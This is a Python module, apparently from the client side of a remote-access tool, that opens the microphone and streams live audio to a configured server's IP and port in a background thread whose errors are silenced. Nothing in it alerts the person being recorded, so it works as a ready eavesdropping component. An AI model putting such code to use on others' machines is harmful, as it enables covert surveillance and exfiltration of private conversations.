'''
    Creates a connection to the server, sending a stream
    of audio data using the specified channels & rate.

    Verified: 2021 February 6
    * Follows PEP8
    * Tested Platforms
        * Windows 10
    * Third Party Modules
        * pyaudio
'''

from client.modules.module import Module
from shared.helper import Helper
from shared.state import Static
from shared.error import Error
from shared.data import Data

import pyaudio
import socket


class Audio(Module):

    def __init__(self, token):
        super().__init__(token)
        self.__audio = pyaudio.PyAudio()

    @Error.quiet_thread
    def __send(self, channels, rate):
        try:
            stream = self.__audio.open(format=pyaudio.paInt16,
                                       channels=channels, rate=rate,
                                       frames_per_buffer=Data.BUFFER_SIZE,
                                       input=True)

            try:
                with socket.create_connection(
                        (Static.IP, Static.PORT)) as sock:
                    Data.send(sock, self.token)
                    Data.recv(sock)

                    while True:
                        Data.send(sock, stream.read(
                            Data.BUFFER_SIZE), False)
                        Data.recv(sock)
            finally:
                stream.stop_stream()
                stream.close()
        finally:
            self.__audio.terminate()

    def live(self, channels, rate):
        Helper.thread(self.__send, channels, rate)
